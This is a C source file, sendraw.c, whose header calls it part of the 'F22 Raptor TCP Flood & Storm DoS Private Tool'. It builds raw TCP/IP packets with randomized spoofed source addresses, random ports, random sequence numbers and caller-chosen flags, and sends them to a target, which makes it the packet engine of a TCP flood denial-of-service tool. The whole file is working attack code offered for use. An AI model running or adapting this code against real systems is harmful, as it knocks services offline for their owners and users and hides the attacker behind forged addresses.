/* 
 * $Id: sendraw.c,v 1.7 2009-08-16 14:17:54-03 nbrito Exp $
 *
 * Author: Nelson Brito <nbrito@sekure.org>
 *
 * Copyright© 2004-2009 Nelson Brito.
 * This file is part of F22 Raptor TCP Flood & Storm DoS Private Tool.

   This program is free software; you can redistribute it and/or modify it under
   the terms of the GNU General Public License  version 2, 1991  as published by
   the Free Software Foundation.

   This program is distributed  in the hope that it will be useful,  but WITHOUT
   ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
   FOR A PARTICULAR PURPOSE.
 
   See the GNU General Public License for more details.

   A copy of the GNU General Public License can be found at:
   http://www.gnu.org/licenses/gpl.html
   or you can write to:
   Free Software Foundation, Inc.
   59 Temple Place - Suite 330
   Boston, MA  02111-1307
   USA. */
#ifndef SENDRAW_C__
#define SENDRAW_C__ 1

#include <common.h>

/* Function Name: Raw packet routine.

   Description:   

   Targets:       N/A */
const int32_t sendraw(register int32_t sock, struct options o){
	int32_t             status;  /* status to be returned */

	struct  timeval     seed;    /* seed for random       */
	struct  sockaddr_in sin;     /* socket address        */
	struct  iphdr     * ip;      /* IP header             */ 
	struct  tcphdr    * tcp;     /* TCP header            */
	struct  psdhdr    * pseudo;  /* PSEUDO header         */

	u_int8_t   packet[IPHDR_SIZE + TCPHDR_SIZE];
	u_int8_t   checksum[PSDHDR_SIZE + TCPHDR_SIZE];

	/* Setting SOCKADDR structure. */
        sin.sin_family      = AF_INET;
        sin.sin_port        = htons(o.dest);
        sin.sin_addr.s_addr = o.daddr;

	/* Using microseconds as seed. */
	gettimeofday(&seed, (struct timezone *)0);
	srand((unsigned) seed.tv_usec);
					
	/* Packet making a pointer to IP Header structure. */
	ip              = (struct iphdr *) packet;
	ip->version     = IPVERSION;
	ip->ihl         = IPHDR_SIZE/4;
	ip->tos	        = o.tos;
	ip->frag_off    = 0;
	ip->tot_len     = htons(IPHDR_SIZE + TCPHDR_SIZE);
	ip->id          = htons(o.id);
	ip->ttl         = o.ttl;
	ip->protocol    = IPPROTO_TCP;
	ip->saddr       = INADDR_RND(o.saddr);
	ip->daddr       = o.daddr;
	ip->check       = in_cksum((u_int16_t *)&ip, htons(ip->tot_len));

	/* Packet making a pointer to TCP Header structure. */
	tcp             = (struct tcphdr *)(packet + IPHDR_SIZE);
	tcp->source     = htons(IPPORT_RND(o.source)); 
	tcp->dest       = htons(IPPORT_RND(o.dest));
	tcp->seq        = ((rand() & 0xffffffff) << 16) + (rand() & 0xffffffff);
	tcp->ack_seq    = o.ack_seq ? htonl(o.ack_seq) : ((rand() & 0xffffffff) << 16) + (rand() & 0xffffffff);
	tcp->res1       = 0;
	tcp->doff       = TCPHDR_SIZE/4;
	tcp->fin        = o.fin     ? o.fin            : 0;
	tcp->syn        = o.syn     ? o.syn            : 0;
	tcp->rst        = o.rst     ? o.rst            : 0;
	tcp->psh        = o.psh     ? o.psh            : 0;
	tcp->ack        = o.ack     ? o.ack            : 0;
	tcp->urg        = o.urg     ? o.urg            : 0;
	tcp->ece        = o.ece     ? o.ece            : 0;
	tcp->cwr        = o.cwr     ? o.cwr            : 0;
	tcp->window     = o.window  ? htons(o.window)  : ((rand() & 0xffff) << 4) + (rand() & 0xffff);
	tcp->check      = 0;
	tcp->urg_ptr    = o.urg_ptr ? htons(o.urg_ptr) : ((rand() & 0xffff) << 4) + (rand() & 0xffff);

	/* Building the Checksum Packet.
	   Zeroing the content of the checksum. */
	memset(&checksum, 0, sizeof(checksum));
	
	/* Checksum Packet making a pointer to PSEUDO Header structure. */
	pseudo          = (struct psdhdr *)(checksum);
	pseudo->saddr   = ip->saddr;
	pseudo->daddr   = ip->daddr;
	pseudo->zero    = 0;
	pseudo->protocol= ip->protocol;
	pseudo->len     = htons(TCPHDR_SIZE);
	
	/* Copying the TCP header to the checksum. */
	memcpy(checksum + PSDHDR_SIZE, tcp, TCPHDR_SIZE);

	/* Computing the checksum. */
	tcp->check      = in_cksum((u_int16_t *)&checksum, TCPHDR_SIZE + PSDHDR_SIZE);

	/* Sending packet. */
	status = sendto(sock, &packet, sizeof(packet), 0, (struct sockaddr *) &sin, sizeof(struct sockaddr));

	/* Returning the status. */
	return(status);
}
#endif  /* SENDRAW_C__ */
